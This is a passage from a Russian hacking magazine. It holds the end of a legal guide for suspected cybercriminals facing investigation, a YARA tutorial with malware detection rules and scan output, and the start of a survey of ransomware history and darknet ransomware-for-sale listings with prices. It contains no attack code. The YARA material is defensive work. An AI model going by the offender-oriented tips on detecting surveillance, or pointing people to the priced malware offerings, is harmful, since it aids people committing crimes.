Первая «нить» может идти откуда угодно: информаторы, данные про вай‐
деров, какие‐то ана литические резуль таты тра фика или сообщение граждан
о совершенном в отношении них противоправном действии.
  По каким признакам можно понять, что ты «под колпаком»? Главный инс‐
трумент — интуиция. Но есть и более объ ективные признаки.
 • Твой телефон начал странно работать; есть подозрения, что тебя прос‐
   лушивают.
 • Появляются «новые друзья», которые интересуются твоей деятельностью.
 • У соседей спрашивают о тебе незнакомые люди — это могут быть сот‐
   рудни ки органов.

Если ты действительно делаешь что‐то противоправное, то у тебя еще может
быть шанс вовремя остановиться. Впрочем, если сотрудни ки органов начали
опрашивать соседей или родс твенников в открытую — значит, разработка
тебя под ходит к заключительному этапу и уже есть материал проверки,
который готовят ся передать следователю для воз буждения уголовного дела.


ПРОВЕРКА ДО ВОЗБУЖДЕНИЯ УГОЛОВНОГО ДЕЛА
Прежде чем возбудить уголов ное дело, правоохранительные служ бы рас‐
сматривают материал про верки. Если такой матери ал существует, значит,
у правоохранитель ных служб уже есть сведения о возможном совершении
преступления.
  Одна из тактик — собрать все доказательства на этой стадии, чтобы рас‐
следование уголовного дела не затягивалось. Иной раз после рас смот рения
материала проверки следователю остается только процессуаль но оформить
и направить уголовное дело в суд.
  Фишка в том, что про верка длится до 30 суток, затем сотрудник выносит
формальное постановление об отказе в возбуждении уголовного дела, про‐
курор отме няет это постановление и срок проверки начинается заново.
Таким образом рассматривать матери ал про верки и искать доказательства
можно долго: я видел материалы проверки пятилет ней давности, и это вовсе
не редкость.
   Уголовное же дело нель зя продлевать веч но. Следователи стремят ся рас‐
следовать его в течение двух месяцев. Только дела с большим обществен‐
ным резонансом позволяется расследовать больше года.
   Ряд следс твен ных действий можно проводить даже в рамках проверки:
 • осмотры места происшествия (например твоей квартиры), в рамках
   которого могут изымать технику;
 • опрос (это не следс твенное действие в полном смыс ле, но на показаниях
   опроса будет стро ить ся допрос, также если статья вдруг подследственна
   органу доз нания, то опрос может быть доказательством);
 • экспертизы;
 • получения образцов голоса, почерка, отпечатков пальцев и ладоней рук,
   генотипа — для сравнительного исследования;
 • запросы про вайдерам, в банки, сотовые ком пании и другие организации;
 • поручения в другие службы, в том числе иностранные через Интерпол.


Осмотр
Без возбуждения уго лов ного дела произвести обыск не получится, но если
у тебя в квартире есть явные следы преступления, то все необ ходимое могут
сделать в рам ках обычного осмотра места происшествия — и даже против
твоей воли. Осмотр против воли при дется еще узаконивать пос тфак тум через
суд, чтобы изъ ятые доказательства считались законными. Впрочем, следова‐
тели идут на такой шаг, только если имеют на руках железобетонные осно‐
вания, а суды в большинстве слу чаев согласны уза конить такие действия.
   Также, если обстоятельства не терпят промедления, даже обыск мож но
проводить без предварительного разрешения суда и уза конить его впос‐
ледствии.
  Чем осмотр жилища отличается от обыска? В обоих случаях действие
может происходить против твоей воли и сопровождать ся изъ яти ем вещей,
но согласно законодательству отличие заключается в целях. Но и тут чет ких
границ нет.
  На прак тике осмотры стремятся делать «мягче», не вывора чивают все
наизнанку, а просто исследуют место. Тем не менее и при осмотре сотрудни‐
ки могут искать где угодно и что угодно.


Опрос
В рамках про вер ки тебя могут вызвать на опрос (не доп рос!). На опрос раз‐
решается взять с собой адвоката. Это не обязательно, но тут важно реалис‐
тично оце нить риски. Возможно, сра зу же пос ле опроса про тив тебя возбудят
уголовное дело и твои проблемы резко обретут серьезный оборот.
  В любом слу чае договорись с хорошим адвокатом, чтобы он был готов
экстренно приехать к тебе. Если тебя задержат, то ты уже не сможешь
покинуть здание правоохранительной службы самостоятельно.


УГОЛОВНОЕ ДЕЛО
Если в отно шении тебя возбудят уголовное дело, ты, конечно, сразу об этом
узнаешь. Скорее всего, следователь сообщит тебе даже не по почте, а уже
в своем кабине те, официально пригласив на следственные действия.
  Но есть нюанс — уголовное дело можно возбудить и в отношении неус‐
тановленного лица. У следствия может быть недостаточно улик, или прес‐
тупника действительно пока не вычислили. А может быть, неформально тебя
уже «установили», просто следователь использует такую уловку, чтобы вести
оперативно‐разыс кные и следственные мероприятия, пока ты остаешься
в неведении.


Сценарии взаимодействия со следствием
Сценарий первый: ты узнал, что рассле дует ся уголов ное дело в отно шении
неустановленного лица. Лично тебя активные действия органов не зат рагива‐
ют, но ты принимал в преступле нии реаль ное участие (если не принимал, то
беспокоиться не о чем, я не слышал, чтобы сажали невиновных именно
по киберпреступлениям).
   Второй сценарий: ты узнал, что расследуется уголовное дело в отношении
неустановленного лица, а тебя привлека ют к неактивным следственным дей‐
ствиям (допросы в качестве сви детеля, обыски при сохранении статуса сви‐
детеля и так далее); при таком раскладе у тебя будет меньше прав, чем в ста‐
тусе подоз рева емого, что упрощает рассле дование.
   Третий сценарий: когда в отношении тебя возбуждено уголовное дело
или тебя доп росили в качестве подозреваемого (эти события равнозначны —
в обоих у тебя статус подозреваемого).
  По первым двум сценариям дос таточ но выработать линию самостоятель‐
ной защиты и по возможности обсу дить со специалистом, как могут раз‐
виваться события, что могло бы смягчить, а что — усугубить наказание.
  В третьем случае нужно незамедлительно заключить соглашение с адво‐
катом.
  В любом случае, если ты узнал, что против тебя что‐то затевается, даже
если это проверочные мероприятия, ты должен как можно ско рее прекратить
любую незаконную деятельность и посиль нее натянуть на уши белую шляпу,
раз и навсегда перей дя на светлую сторону. Возможно, тебе повезет и ты
отделаешься тревожным зво ночком и пот раченными нервами.


Предварительное следствие
Предварительное следствие делит ся на несколько этапов.
  Первый этап — возбуждение уголовного дела — мы уже разобрали.


Допрос
Второй этап начинается вскоре — это доп рос. При предварительном рас сле‐
довании он наделяет тебя уголовно‐процессуаль ным статусом: свидетель,
подозреваемый, обви няемый.
  Каждый из этих статусов подразумевает свои права и обязанности в рам‐
ках конкрет ного уголов ного дела, ты можешь ознакомиться с ними в УПК РФ.
   Если преступление не тяжкое, тебя вызовут на доп рос, изберут меру пре‐
сечения, не связанную с лишением свободы (под писка о невыезде и над‐
лежащем поведении), и будут вызывать по звонку на другие следственные
мероприятия.
  В случае тяж кого преступления тебя могут задержать, причем даже
до возбуждения уголов ного дела. Сотрудни ки оперативных служб поймают
тебя в любом месте, кроме жилища  (тут все‐таки нужно решение суда
и открытое уголовное дело), дос тавят в кабинет следова теля и оформят про‐
токол задер жания.


Задержание
Сотрудники могут подойти к тебе в любой момент, даже когда ты спокойно
идешь по ули це. Они представятся и сообщат, что ты задержан. Луч ше
не сопротивляйся, ведь любой синяк на теле сот рудника органов — это уго‐
ловная статья.
  Нужно  позвонить родственникам или адвокату, но  делать  это без
агрессии, иначе при досмотре телефон моментально изымут.
   Тебя приведут  к следователю, и он составит протокол задер жания.
Во вре мя задержания присутствие адвоката непринципиально. Все равно
повлиять на задержание ты не можешь, если оно законно. А законно оно
в трех исклю читель ных случаях:
 • когда задержанный застигнут при совершении преступления или непос‐
   редственно после его совершения;
 • когда потерпевшие или очевидцы укажут на него как на лицо, совер‐
  шившее преступле ние;
 • когда на человеке или его одежде, при нем или в его жилище будут обна‐
   ружены явные следы преступления.

Протокол задержания нужно обязательно подписать, поскольку пометка сле‐
дователя «от подписи отка зался» негативно скажется при рас смотрении уго‐
ловного дела судом.
  Проверь, что бы время задержания в протоколе совпадало со временем
фактического  задержания. С  этого момента  отсчитывается 48  часов,
в течение которых сле дователь должен выйти в суд с ходатайством на арест
и подготовить материалы, доказывающие, почему лишение свободы необ‐
ходимо для объ ективного расследования уголов ного дела.
  При задер жании следователь обязан дать тебе сде лать звонок, восполь‐
зуйся этим правом мудро. Не звони подельникам, ведь весь ваш разговор
будут слышать сотрудники (и смогут отследить звонок), а придумы вать сло‐
весный шифр на ходу — плохая идея.
   Лучше позвони родс твенникам, чтобы они как можно скорее привезли
тебе постельное белье и теп лые вещи, что бы ты не околел в изоляторе. Сле‐
дователи пой дут тебе навстречу и подож дут, ведь потом передать вещи
в изолятор будет намного сложнее.


Обыск
На ранних стадиях расследования обязательно проводится осмотр места
происшествия или обыск, в котором должны участвовать хотя бы двое
понятых. Искать и изымать будут любые пред меты, представляющие интерес
для расследования. Тебе запретят покидать зону обыска. В конце сотрудники
составят протокол обыска, ты сможешь с ним ознакомиться и сде лать
фотокопию.
   Если твою тех нику — будь то жесткий диск или ПК целиком — хотят отклю‐
чить и заб рать, во время обыска обя зательно должен присутствовать эксперт
по ИТ (граждан ское лицо или спе циалист экспертно‐кримина листичес кого
центра). Опе ративный сотрудник, даже если он из отдела «К», не может
заменить такого специалиста.


Экспертизы
Если ты подозреваемый или свидетель, дальше тебя ждут экспертизы.
  Экспертизы могут быть разных нап равлений: от компьютерных, до фонос‐
копических, дактилоскопичес ких, биологических. Все зависит от исследуемых
объектов. В любом случае с экспертизами обязательно зна комят подозрева‐
емого. А свидетеля — только тогда, когда у него изы мались образцы непос‐
редственно.


Иные следственные действия
 • Дача показа ний на месте: под видео‐ или фотопротоколирование ты
   будешь пря мо на месте преступления рассказывать и показывать, что
   и как делал.
 • Следственный   экспе римент:   сотрудники   воспроизведут   усло вия,
   при которых совершалось преступление, чтобы убедиться, что их или твои
   предположения реалис тичны.
 • Очная став ка. Даже если ты постро ил идеальную техническую защиту,
   отказываешься признавать вину, а у следствия нет объ ективных доказа‐
   тельств, тебя всегда может сдать твой напар ник. В таком случае следствие
   проведет очную ставку между тобой и напарником, где он расскажет, «как
   было», а ты либо будешь стоять на своем, либо согласишь ся с ним.
  В любом слу чае у вас возникнет противостояние версий, цель которого –
   установить истину.


Обвинение
В конце концов, когда у следствия сфор мирова на квалификация тво их дей‐
ствий, тебе предъявят обвинение. С обви нением ты можешь согласиться,
частично согласиться или не согласиться. На этом эта пе тебя обя затель но
допросят еще раз — уже в качестве обвиняемого, чтобы рас ставить все точки
над «и» и понять твое отно шение  к  уголовному прес ледованию  (рас‐
каиваешься или нет) и конечную позицию по тво ему деянию, с которой ты
предстанешь перед судом.


Заключительная часть предварительного расследования
Тебе обязательно дадут на озна комление все материалы уголовного дела,
о чем составят протокол. Ты сможешь изу чить все доказательства, которые
собрал следователь, и сов местно с адвокатом выбрать окончательную линию
защиты для суда. В протоколе ознакомления ты можешь ходатайствовать
о выборе судебного производства (например в особом порядке или судом
присяжных).
  На этом этапе следс твенные действия завер шены. Дальше уголовное
дело направят в прокура туру на согласова ние, а затем и в суд.


Признание вины, явка с повинной и особый порядок
Признавать вину или нет — решать только тебе. Главное правило: ни в коем
случае не приз навайся в том, чего ты не совершал. Если к тебе применяют
насилие или  угрозы  («признавайся, а  то будем  бить»), пригрози,  что
напишешь заяв ление в Следствен ный комитет. На этом угрозы, скорее всего,
закончатся, поскольку «выбивание» показа ний — преступление со стороны
сотрудников и вле чет за собой серьезные санкции.
   Когда ты действительно совершил преступление, отрицание вины —
это худший вариант, если уголовное дело попадет в суд. Суд даст максималь‐
ный срок, да еще с лишением свободы.
  И наоборот, уголовное производство очень гуманно к тем, кто соз нает ся.
Если ты совершил преступление впер вые и признался в нем, не будет даже
суда, толь ко судебный штраф. В результате у тебя не останется судимости.
Это нововведение в законодательстве. В применении судебного штрафа
есть свои нюансы, подробнее читай в УПК РФ.
   Что еще поможет? Явка с повинной. В старые времена она была «царицей
доказательств», но сейчас это лайфхак, позволяющий скостить максималь ное
наказа ние. Даже если ты написал явку с повинной, а потом все следствие был
в отрицании и тебя признали виновным на суде — явка тебя выручит.
   Если усло вия применения судебного штрафа не выпол няются — есть осо‐
бый порядок. Приз нал пол ностью вину? Проси особый порядок. Тогда суд
не рас сматрива ет дело по существу, а лишь решает вопрос о санкциях.
В большинстве слу чаев особый порядок повлечет за собой условное наказа‐
ние или (если еще и ты явился с повинной) минимальный реальный срок.


Адвокат
Адвокат — твой главный инструмент защиты. Можешь нанять его сам, «по
соглашению», либо воспользоваться услугами бес плат ного защитника, пре‐
доставленного государством. Адвокат по назначению не просто формаль‐
ность, многие из них добросовестно защищают, а знамени тые «карманные
адвокаты следователя» давно остались в прошлом, поскольку назначаются
не по звон ку следова теля, а согласно очереди, установленной в коллегии
адвокатов. Зачастую назначенного защитника будет достаточно, особенно
если твоя стра тегия — признание вины. В этом слу чае эффективнее будет
потратить деньги не на адвоката, а на возмещение ущерба.
   Если же ты понимаешь, что тебе вменяют больше, чем ты совершил,
нанимай адво ката по соглашению. Хороший защитник стоит дорого, при этом
никогда не будет гарантировать тебе уход от ответственности и даже пре дуп‐
редит об этом прямо. Конеч но, если это действительно профессионал, а не
адвокат‐маркетолог,  который  будет  имитировать  бурную  деятельность
и давать обещания за твои деньги. К сожалению, рейтингов профессионализ‐
ма адвокатов нет, приходится ориенти роваться на сарафанное радио, пре‐
дыдущий опыт в нужной категории дел и репутацию.


ОБЩИЕ СОВЕТЫ, КАК ОБЩАТЬСЯ СО СЛЕДСТВИЕМ
Не кон фликтуй с представите лями государства, у них всегда больше пол‐
номочий. Особен но это касается сле дова теля, ведь это единствен ный сот‐
рудник, который реально может пов лиять на судьбу уголовного дела в диапа‐
зоне от «не доказа но» до «мак симальный срок и худшие условия в изолято ре
временного содер жания и на зоне».
  Субординация — важ ный момент. Сколько раз я видел, как подозрева‐
емый горь ко распла чива ется за свое развязное поведе ние с женщиной‐сле‐
дователем. И наоборот, увидев с тво ей стороны уважение и понимание, сле‐
дователь, вероятно, ответит тем же.
   Уступать следствию тоже не стоит, ведь их работа — направлять в суд уго‐
ловные дела с как можно более тяжкими составами для улучшения статис‐
тики.
  Оптимальная модель поведе ния — договариваться. Например, следова‐
тель часто забыва ет ознакомить подозреваемого с пра вами перед началом
следственного дей ствия. Гораздо лучше не писать жалобу, а упомянуть
об этом с понима нием, попросить его пойти тебе навстречу, смягчить вину.
Жалобу твою все равно не удовлетворили бы, а вот расположение следова‐
теля пригодится.
  Следователь тоже человек и стремится делать свою работу по справед‐
ливости. Если видишь, что следова тель мечет ся между совестью и требова‐
ниями начальства улучшить показа тели по тяжести и количеству составов,
покажи свои луч шие стороны. Дай ему понять, что ты всего лишь совершил
ошибку, но теперь готов стать оче ред ным «Кевином Митником» и учить
молодых хакеров не совершать ошибки и не преступать закон.


ПАМЯТКА

 • Преступления в интернете влекут более суровое наказание.
 • Полиция уме ет ждать, а преступники теряют бди тельность.
 • Если запахло паленым — немедленно прекращай темные дела.
 • Каждый факт нарушения — отдельное преступле ние.
 • Следи за признаками того, что тебя разрабатывают.
 • Под тебя могут копать без возбуждения уголов ного дела.
 • Проконсультируйся с адвокатом по поводу тактики и заранее договорись
  о срочном выезде.
 • Статус сви детеля не гарантирует твою безопасность.
 • Подельник может тебя подста вить.
 • Не сопротивляйся при задержании.
 • Не звони подель нику, позвони адвокату или родственникам.
 • Попроси родствен ников привезти тебе теплые вещи для изолятора.
 • Проверь вре мя задержания и подпиши протокол.
 • Особый порядок, признание и явка с повинной уменьшат твое наказание.
 • Не сознавай ся в том, чего не совер шал, — даже под давлением.
 • Бесплатный адвокат не всег да бесполезен.
 • Платный адво кат не всегда хорош, выбирай по отзывам.
 • Не конфликтуй со сле дователем, а договаривайся с ним!
ВЗЛОМ
YARA



        ПИШЕМ ПРАВИЛА,
       ЧТОБЫ ИСКАТЬ МАЛВАРЬ
           И НЕ ТОЛЬКО





     Борис Осепов                                                       Александр Мессерле
   Специалист Group‐IB.                                                           ИБтивист. Исследую в ИБ то,
   Увлекаюсь средствами                                                                 что движется. То, что не
 анализа вредоносного ПО.                                                          движется, кладу в песочницу.
    Люблю проверять                                                                      nayca@mail.ru
маркетинговые заявления на
        практике :)
  mainboros777@gmail.com





YARA —  это популярный и  универ сальный инс тру мент,
который иног да называют швейцарским ножом для иссле‐
дователей вре донос ных программ, но исполь зовать его
можно и в других целях. Сегод ня мы выс тупим в жан ре «Сам
себе анти вирус» и расска жем, как с помощью YARA писать
правила и искать фай лы по харак терным признакам.


В нашей прош лой статье («Хеш четкий и хеш нечеткий») мы рас ска зали,
как загружали заранее классифицированные объекты и при этом полностью
уповали на знания рандомных аналитиков и верили (конечно, не до конца!),
что там действительно находится малварь конкрет ного семейства. Такое час‐
то про исхо дит в реальном мире, вредоносное ПО настолько быстро появ‐
ляется, что информацию о том, как идентифици ровать угрозу и быстро реали‐
зовать пра вило детектирования, порой бывает почти что вопросом жизни
или смер ти.
  YARA — это опенсорсный инстру мент, который помогает исследователям
искать и классифицировать вре доносные семплы и даже проводить Threat
Hunting. Утилита выполняет сигнатурный анализ на основе формальных YARA‐
описаний (пра вил). В них содержатся индикато ры компрометации для раз ных
типов вредоносного ПО.
  Фишка в том, что делать правила лег ко и не занимает много вре мени.
Именно поэтому YARA используют в AlienVault, Avast, ESET, FireEye, Group‐IB,
Kaspersky, Trend Micro, Virus Total, x64dbg... В общем, почти все, кто имеет
дело с ана лизом вредоносного ПО.
   YARA‐пра вила могут обрабатывать не только исполняемые файлы, но и
документы, библиоте ки, драйверы — все что угодно. Ими же можно сканиро‐
вать сетевой тра фик, хранилища данных, дампы памяти. Эти правила можно
включать в дру гие инструменты, такие как SIEM, антифишинг, IDS, песочницы.
  Давай раз берем ся, как же выглядят эти пра вила и как их составлять.


СТРУКТУРА ПРАВИЛ
Обычно правила хранятся в текстовом формате в файле .yar и состоят из двух
секций:
 • секции определений (strings) — содержит характерные для малвари кон‐
   станты, хеши, HEX‐фрагменты, ссыл ки, строки;
 • секции усло вия (condition) — содержит условия, по которым принимаются
  решения отно сительно анализируемо го файла.

Выглядит это так:


rule SomeMalwareName {


meta:
author = "AuthorName"


strings:
…


condition:
…
}


ПРИМЕНЯЕМ YARA
Минимально необходимые сек ции — это название правила и его условия.
Например, правилом ниже мы будем детектировать объекты только по их im‐
phash (на тестовых объектах из предыдущей статьи):


import "pe"


rule MyLittleAgentTeslaRuleDetect {


condition:
    pe.imphash() == "b21a7468eedc66a1ef417421057d3157" or
    pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744"
}

Сохраним файл как AT.yar и запустим на дирек тории с семплами Agent Tesla.
Посмотрим на результат и убедимся, что правило отработало на всех пред‐
ставителях Agent Tesla.



  C:\>yara64.exe ‐r AT.yar AgentTesla
  MyLittleAgentTeslaRuleDetect AgentTesla\AT11.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT12.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT13.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT14.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT16.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT2.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT18.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT15.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT10.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT3.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT6.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT7.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT1.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT9.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT4.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT17.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT5.exe
  MyLittleAgentTeslaRuleDetect AgentTesla\AT8.exe


Результат — все из всех.
   Как ты мог заметить, правила YARA под держивают импорт полезных
модулей. Соот ветс твенно, можно написать свои модули. Вот несколь ко
наиболее часто используемых:
 • pe — фун кции, нужные при работе с объектами Portable Executable, нап‐
  ример кон троль ная сумма imphash, метка времени создания, расположе‐
   ние секций;
 • hash — расчет контрольных сумм и криптографичес ких хешей;
 • math — математические подсче ты, например сред нее арифметическое
   или энтропия.

Полный список ты всегда можешь глянуть в официальной докумен тации
по YARA.


ПИШЕМ ПРАВИЛА
В опциональной сек ции опре делений можно юзать маски (wildcard, подобия
регуляр ных выражений). Например, для шес тнадцатеричных строк возможны
такие мас ки:
 • символ ? — наличие любого бай та на месте этого символа;
 • диапазоны ([46] — от 4 до 6 различных байтов);
 • альтернативы (логичес кое ИЛИ — | ).

Рассмотрим еще один пример с несколькими правилами и продемонстри‐
руем тебе разнообразие воз можностей детектирования YARA:


import "hash"


rule MyExe_RUFUS {
strings:
    $my_HEX_string = { E0 38 D2 21 32 4D 1B C1 79 EC 00 70 76 F5 62
B6 }


condition:
    $my_HEX_string and hash.md5(0,
filesize) == "d35936d329ac21ac3b59c525e2054078"
}


rule MyExe_Hercules4 {
strings:
    $my_HEX_string = { 59 (E9 D8|FF) 1A 00 00 5? E8 [4‐6] 94 8F }
condition:
    $my_HEX_string
}


rule MyURL_Yandex {
strings:
    $my_URL_string = "https://yandex.ru"
condition:
    $my_URL_string
}


rule MyRar_SFX {
strings:
    $winrar1 = "WINRAR.SFX" nocase wide ascii
    $winrar2 = ";The comment below contains SFX script commands"
wide ascii
    $winrar3 = "Silent=1" wide ascii
    $winrar4 = { E8 65 64 00 00 E9 78 FE FF FF}
    //$winrar4 = "sfx" nocase
condition:
    1 of them
}

Разберем каж дое из правил:
 • MyExe_RUFUS — правило срабатывает, если будет обнаружен указанный
  машинный код и совпадет хеш MD5;
 • MyExe_Hercules4 — пример правила с использовани ем маски по шес‐
   тнадцатерич ным значениям. 59 (E9 D8|FF ) — значит, что дол жно встре‐
   титься после байта 59 либо два байта E9 D8, либо один байт FF. 5? значит,
   что здесь может быть вариация от 50 до 5F. E8 [4‐6] 94 зна чит, что между
   байтами E8 и 94 могут быть любые от 4 до 6 байт.
 • MyURL_Yandex — правило сра баты вает при нахождении в объекте стро‐
   ки, содер жащей ссылку.
 • MyRar_SFX — пример правила для поиска архивов SFX. "sfx" nocase
   означает, что строка может быть с любой вариацией регистров символов,
   например Sfx или SFX . Параметр wide ascii означает, что в строке
   должно быть соответствие по ASCII‐символам, которые могут кодировать‐
   ся двумя бай тами (wide), что типично для исполня емых бинарников.

Посмотрим, как выглядят исходные файлы для тестирования правил.





Запустим проверку с нашим правилом MyExe.yar и оценим резуль тат.



  C:\>yara64.exe ‐r MyExe.yar C:\SAMPLES
  MyExe_Hercules4 C:\SAMPLES\Hercules4.exe
  MyExe_RUFUS C:\SAMPLES\rufus‐2.17p.exe
  MyRar_SFX C:\SAMPLES\HV_DETECT_FIN.exe
  MyURL_Yandex C:\SAMPLES\Dear_Recipient.pdf


Документы PDF и DOCX иден тичны, но YARA не смог ла най ти строку ссылки
в нем, так как формат DOCX — это архив ZIP. Для работы с ним нужно будет
добавить кас томный модуль для работы с архивами, но мы не будем в это
углублять ся.
  Самое главное — грамотно составить усло вие, по которо му будет про‐
веряться файл. Обычно оно комбинирует переменные из секции определе‐
ния, под держи вают ся логичес кие операторы вро де or и and, скобки и кон‐
станты. Например:
 • filesize — раз мер фай ла;
 • at — задание смещения;
 • 1 of them — хотя бы одно условие из перечисленных в правиле должно
   выполниться;
 • any of them — то же самое, что «1 of them».

И так далее, полный список смотри в документации.


АВТОМАТИЗАЦИЯ
Для получения правил есть три пути: ска чать готовые (ссылки — ниже), сде‐
лать самому (вари ант для энтузиастов) либо заставить машину сделать их
самостоятельно. В пос леднем случае подойдут разные генераторы, нап‐
ример yabin, YaYaGen, yarGen, BASS. В основном для генерации правил они
находят уникальные строки в фраг ментах вредоносов, но ты сам понимаешь,
что это не самый надежный способ.


ПОЛЕЗНЫЕ ССЫЛКИ
Остался только один вопрос: где взять все эти готовые индикаторы компро‐
метации (IoC) и правила? Отвечаем: есть официальный репозиторий (и его
зеркало) и масса агрегаторов правил в подборке на GitHub.
  Все правила, кстати, ты можешь объединить в один файл .yar. Единствен‐
ное требование — у пра вил должны быть уникальные имена, которые будут
выводиться в результате работы программы.
ВЗЛОМ





 Юрий Скворцов
ayammsp@gmail.com




ВЫМОГАТЕЛЬСТВО
      КАК УСЛУГА

                   КТО И ЗА СКОЛЬКО
               ПРЕДЛАГАЕТ В ДАРКНЕТЕ
        ПОМОЧЬ С ВЫМОГАТЕЛЬСТВОМ




Эпидемии  троянов‐шифровальщиков  регулярно сменяют
одна другую, и их мас штабы все рас тут. А за кулиса ми этой
проблемы сто ят дельцы, которые предлагают желающим
легкий спо соб стать хакерами (и с хорошей вероятностью —
зарабо тать судимость). В этой статье я расскажу о том, как и
за сколько в дар кне те пред лагают услу ги и софт для вымога‐
ния денег.


Но начнем мы с того, что разберемся в истории вымогательской малвари.


ЭВОЛЮЦИЯ ЦИФРОВОГО ГОП-СТОПА
Первая зафиксированная эпи демия шифровальщика произошла в 1989 году,
когда норвежский биолог Джозеф Попп разослал по почте дискету, этикетка
которой обе щала просветительскую информацию о СПИДе. В реальности
программа внедрялась в AUTOEXEC.BAT, скрывала папки и повреждала фай‐
лы. Во вре мя следующей загрузки пользователь видел предложение обно‐
вить лицензию ОС, отправив 189 долларов по почте в Панаму на счет ком‐
пании PC Cyborg Corporation, дальше компьютер не загружался.
  В основе AIDS лежала симметричная криптогра фия, то есть для шиф‐
рования и расшифровки информации использовался один и тот же ключ,
поэтому таблетку от вируса сделали довольно быстро. Поп па вскоре нашли,
но признали невменяемым и отправили на лечение. Соз датель первого
вымогателя прос лавился тем, что носил на голове картонную коробку
для защиты от радиации.





                Предупреждение о заражении AIDS

На про тяже нии следующих шестнадцати лет случаи зараже ния программа‐
ми‐вымога телями были все еще редки, несмотря на развитие интернета. Все
изменилось в 2005 году пос ле того, как по сети стала распростра нять ся вре‐
доносная прог рамма GPCoder.
   GPCoder зашиф ровывал информацию, исполь зуя продвинутый для тех
времен криптографический алго ритм RSA. Чуть позже появился Archievus,
который энкрип тил фай лы только в папке «Мои документы». Оба вредоноса
приносили создателям малый профит, потому что антивирусы легко их
находили и уда ляли.
  Вредонос Vundo, который начали применять для вымога тель ства Bitcoin
в 2009 году, тоже провалился. Прог раммисты компании FireEye написали
скрипт для расшифровки данных за несколь ко дней и оставили девелоперов
Vundo без прибыли.





            Сообщение с требованием о выкупе от Vundo

В 2011 году возник новый вид программ‐вымогателей — WinLock. Вместо
того чтобы зашифровывать информацию, локеры бло кировали доступ к Win‐
dows и выводили на экран фей ковое меню для активации ОС. Жертвам пред‐
лагали поз вонить в службу поддержки или отправить SMS, чтобы получить
код. За зво нок и сообщение взимали плату, которая перечислялась прямиком
в карман рэкетирам.
  Тем не менее бизнес‐модель, основанная на при менении локеров, ока‐
залась провальной. В 2012 году вымогатели заработали лишь 5 миллионов
долларов. Сумма серьезная, но по меркам современных угроз — ерунда.
Поэтому уже в следующем году хакеры вернулись к истокам цифрового шан‐
тажа и стали использовать модифициро ванную версию шифровальщика
CryptoLocker.
   Главное отличие CryptoLocker от Vundo заключалось в том, что зашиф‐
рованные файлы было невозможно восстановить, так как для их дешифровки
требовался 2048‐бит ный ключ, который мож но было получить в онлайновой
службе после оплаты. Всего лишь за два месяца доход соз дателей малвари
достиг 27 мил лионов дол ларов в биткой нах.





                 Меню оплаты CryptoLocker

В 2014 году после захвата антивирусными специалис тами ботнета Gameover
ZeuS,  через  который  распространялся  CryptoLocker,  на  рын ке  прог‐
рамм‐вымогателей начали домини ровать его клоны — CryptoWall и Torrent‐
Locker. В 2016 году специалисты обнаружи ли пер вый вирус‐вымогатель
под названи ем KeRanger, пред назначенный для заражения маков. Спустя
несколько месяцев кибербезопасники иден тифицировали многопрофильный
троян Ransom32, способный инфицировать компы с Windows, Mac или Linux.
  В мае 2017 года с появлением крип точервя WannaCry началась новая эра
в истории цифрового гоп‐сто па. WannaCry эксплойтил уяз вимость EternalBlue
в Windows, устанавливал бэкдор, загружал код шифровальщика и, заразив
один компьютер, быстро распространялся по локальной сети. За год червь
пролез в 520 тысяч устройств и нанес ущерб на 4 миллиар да дол ларов. Сов‐
ременник WannaCry — крипточервь Petya, который использовал тот же самый
эксплоит Windows. Вред от «Пети» превысил 3 миллиарда долларов.





                     Карта заражения WannaCry

В 2018 году на электронную почту поль зовате лей сети начали приходить
письма с оригинальным вредоносом GandCrab. Вымога тели соблазня ли юзе‐
ров любовными пос лани ями и архивами с романтичными названиями, нап‐
ример, Love_You_2018. Но архивы были с изюминкой — дистрибутивом, заг‐
ружающим GandCrab. В 2019 году разработ чики «Краба» повесили клешни
на гвоздь, сорвав куш пример но в 2 миллиарда долларов.





               Любовное послание от GandCrab

Эстафетную палочку перех ватили злые гении, стоящие за изобретением
вымогателя REvil, известно го также под име нем Sodinokibi. ИБ‐специалисты
нашли совпадения в кодах GandCrab и Sodinokibi, а также выяснили, что
в обоих используются практичес ки оди наковые функции декоди рования
строк. Поэтому эксперты уверены, что  REvil — это прямой нас ледник
GandCrab.
  На волне хай па вок руг WannaCry и Petya в даркнете запустили сервисы
Ransomware as a Service (RaaS) — тулкиты и платформы для выполнения атак
и получения  выкупа. Львиная доля  клиентской базы RaaS приходится
на ламеров, которые стремятся срубить капусту, но не хотят ничего прог‐
раммировать самостоятельно. Вымогательство  как  услуга представляет
собой модель сотрудничества меж ду опе раторами программ‐шантажис тов
и так называемыми агентами.


RANSOMWARE НА ПРОДАЖУ
На крупнейшем международном мар кет плей се я нашел десяток объ явле ний,
связанных с программами‐вымогателями. Вот они.


           WARNING

                      Вся информация предоставлена исключительно
                        в  ознакоми тельных  целях.  Автор и  редакция
                       не несут ответс твенности за любой воз можный
                        вред, при чинен ный информацией из этой статьи.
                      Распростра нение вирусов и вредоносных прог‐
                    рамм — незаконное действие и влечет за собой
                         уголовную ответс твен ность.



1. Исходный код KingLocker на Python для Windows за 99 евро
Вендор утвержда ет, что после запуска исполня емого файла малварь под клю‐
чается к панели управления сервером, скачива ет ключ, зашифровыва ет дан‐
ные на устройстве и открывает веб‐страницу с требованием выкупа в Bitcoin.
Какую‐либо информацию о слу чаях заражения KingLocker я не обнаружил.
Первое и единс твенное упоминание о вирусе на форуме Raid датиру‐
ется 12 июля 2020 года.


2. Вредонос Sodinokibi/REvil за 2000 долларов
По  сведениям  Panda  Security,  Sodinokibi —  самая  прибыльная  прог‐
